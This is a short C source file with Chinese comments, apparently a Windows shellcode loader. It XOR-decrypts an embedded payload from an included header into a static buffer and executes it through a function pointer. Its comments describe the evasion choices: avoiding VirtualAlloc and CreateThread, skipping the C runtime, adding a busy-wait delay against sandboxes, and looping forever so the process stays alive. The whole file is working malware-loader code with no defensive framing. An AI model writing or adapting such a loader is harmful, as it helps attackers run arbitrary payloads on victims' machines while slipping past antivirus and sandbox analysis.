#include <windows.h>
#include "enc_shellcode.h"

// 手动设置缓冲区为可执行（PE 页属性默认兼容 RX 段）
unsigned char exec_buf[4096 * 10];  // 足够大，避免 VirtualAlloc

// 解密 shellcode（XOR key = 0x5C）
void xor_decrypt(unsigned char *dst, unsigned char *src, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        dst[i] = src[i] ^ key;
    }
}

// 自定义入口，跳过 CRT
void __stdcall mainCRTStartup(void) {
    // 防沙箱延时
    for (volatile int i = 0; i < 100000000; i++);

    xor_decrypt(exec_buf, shellcode, shellcode_len, 0x5C);

    // 函数指针类型转化后直接执行，无 CreateThread
    void (*func)() = (void (*)())exec_buf;
    func();

    // 永驻防止退出（可改为 Sleep 或 ExitProcess）
    while (1) { Sleep(1000); }
}
